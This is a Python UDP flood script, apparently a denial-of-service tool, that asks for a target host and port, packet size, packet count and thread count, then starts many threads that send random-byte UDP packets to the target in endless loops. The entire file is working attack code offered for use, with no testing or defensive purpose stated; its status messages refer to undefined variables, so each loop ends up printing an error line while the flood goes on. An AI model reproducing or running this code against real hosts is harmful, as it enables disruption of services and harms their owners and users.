import random
import socket
import threading
import os,sys

os.system("clear")
print("""\033[95m
  _____        __  __     _____
 |__  /___  ___\ \/ /   _|__  /
   / // _ \/ _ \\  / | | | / / 
  / /|  __/  __//  \ |_| |/ /_ 
 /____\___|\___/_/\_\__, /____|
                    |___/    
""")
print("\033[0m")
p1 = str(input("\033[92mHOST/IP: \033[91m"))
p2 = int(input("\033[92mPORT: \033[91m"))
p3 = int(input("\033[92mURANDOM: \033[91m"))
p4 = int(input("\033[92mPACKET: \033[91m"))
p5 = int(input("\033[92mTHREAD: \033[91m"))
choice = str(input("\033[92mGAS?(y/n): \033[91m"))
os.system("clear")
def run():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run2():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run3():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run4():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run5():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run6():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run7():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run8():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p4):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run9():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p4):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def run10():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p4):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def run11():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p4):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def run12():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p4):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def run13():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p4):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def run14():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p4):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def run15():
    data = random._urandom(p3)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p4):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

for y in range(p5):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
    else:
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
        th = threading.Thread(target = run14)
        th.start()
        th = threading.Thread(target = run15)
        th.start()